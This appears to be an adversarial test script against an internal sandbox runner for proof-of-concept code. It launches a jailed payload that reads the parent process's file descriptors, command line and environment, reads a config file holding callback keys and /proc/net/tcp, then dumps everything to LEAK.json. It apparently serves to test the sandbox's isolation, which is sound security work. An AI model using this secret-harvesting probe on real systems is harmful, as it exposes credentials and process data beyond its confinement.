#!/usr/bin/env python3
"""ATTACK C3 -- capture exactly what the PoC can learn about the listener/parent
(FDs, environ, config) by writing findings to the shared work_dir BEFORE any kill,
so the disclosure survives even if we then kill the parent."""
import os, sys, tempfile
sys.path.insert(0, "/tmp/p13_adv_wt")
from ngv2.poc_runner_live import run_jailed_poc_with_loopback

POC = r'''
import os, glob, json
ppid=os.getppid()
rec={}
def grab(name, fn):
    try: rec[name]=fn()
    except OSError as e: rec[name]="ERRNO %d"%e.errno
    except Exception as e: rec[name]="EXC %s"%e
grab("parent_fds", lambda:[os.readlink("/proc/%d/fd/%s"%(ppid,f)) for f in os.listdir("/proc/%d/fd"%ppid)])
grab("parent_cmdline", lambda: open("/proc/%d/cmdline"%ppid,"rb").read().replace(b"\0",b" ").decode())
grab("parent_environ", lambda: open("/proc/%d/environ"%ppid,"rb").read().decode("utf-8","replace"))
# the config file (in work_dir, shared mount) holds the WHOLE cfg incl callback keys
grab("cfg_files", lambda: [f for f in os.listdir(".") if f.endswith(".json")])
try:
    rec["cfg_content"]=open("_loopback_cfg.json").read()
except Exception as e: rec["cfg_content"]="NO: %s"%e
# Can we see the listener's port via the parent's socket fd or netstat-style /proc/net/tcp?
grab("proc_net_tcp", lambda: open("/proc/net/tcp").read()[:400])
open("LEAK.json","w").write(json.dumps(rec, indent=1, default=str))
print("WROTE_LEAK")
'''
with tempfile.TemporaryDirectory(prefix="advC3-") as tmp:
    wd=os.path.join(tmp,"w");os.makedirs(wd)
    pp=os.path.join(wd,"poc.py");open(pp,"w").write(POC)
    res=run_jailed_poc_with_loopback(["python3",pp],repo_root=None,work_dir=wd,extra_ro=[],
        child_env={"PATH":"/usr/bin:/bin:/usr/local/bin","HOME":"/tmp","LANG":"C.UTF-8",
        "NGV2_SSRF_CALLBACK":"http://127.0.0.1:<<PORT>>/ssrf_secret_nonce_XYZ",
        "NGV2_SSRF_NONCE":"ssrf_secret_nonce_XYZ"},
        timeout_s=20.0,fs_signature="",callback_env_keys=("NGV2_SSRF_CALLBACK",),poc_path=pp)
    print("RESULT stdout:", res.get("stdout"))
    leak=os.path.join(wd,"LEAK.json")
    if os.path.exists(leak):
        import json
        d=json.load(open(leak))
        for k,v in d.items():
            s=str(v)
            print(f"--- {k} ---")
            print(s[:600])
